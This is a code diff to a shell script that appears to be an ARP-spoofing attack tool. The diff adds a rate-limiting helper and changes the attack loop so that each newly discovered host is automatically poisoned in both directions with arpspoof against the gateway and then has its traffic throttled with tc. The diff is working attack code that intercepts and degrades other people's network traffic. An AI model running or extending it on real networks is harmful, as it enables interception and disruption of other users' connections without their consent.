@@ -356,6 +356,13 @@ func_randomize_mac()
     dhclient $INTERFACE > /dev/null 2>&1
 }
 
+func_add_rate_limit_target()
+{
+    local IP=$1
+    tc filter add dev $INTERFACE protocol ip parent 1:0 prio 1 u32 match ip dst $IP/32 flowid 1:1
+    tc filter add dev $INTERFACE protocol ip parent 1:0 prio 1 u32 match ip src $IP/32 flowid 1:2
+}
+
 # Start rate limitting
 func_rate_limit()
 {
@@ -367,8 +374,7 @@ func_rate_limit()
     # Apply for all target IP
     for IP in $TARGET_IP
     do
-        tc filter add dev $INTERFACE protocol ip parent 1:0 prio 1 u32 match ip dst $IP/32 flowid 1:1
-        tc filter add dev $INTERFACE protocol ip parent 1:0 prio 1 u32 match ip src $IP/32 flowid 1:2
+        func_add_rate_limit_target $IP
     done
 }
 
@@ -467,6 +473,9 @@ func_start_attack()
             if ! echo $TARGET_IP | grep -qw "$IP"
             then
                 echo -e "[$(date '+%T')] Discovered new target: $IP"
+                arpspoof -t $IP $GATEWAY > /dev/null 2>&1 &
+                arpspoof -t $GATEWAY $IP > /dev/null 2>&1 &
+                [[ $FORWARD_TRAFFIC == true && $RATE_LIMIT != "Unlimited" ]] && func_add_rate_limit_target $IP
                 TARGET_IP="$TARGET_IP $IP"
             fi
         done < <(echo "$NEW_SCAN")
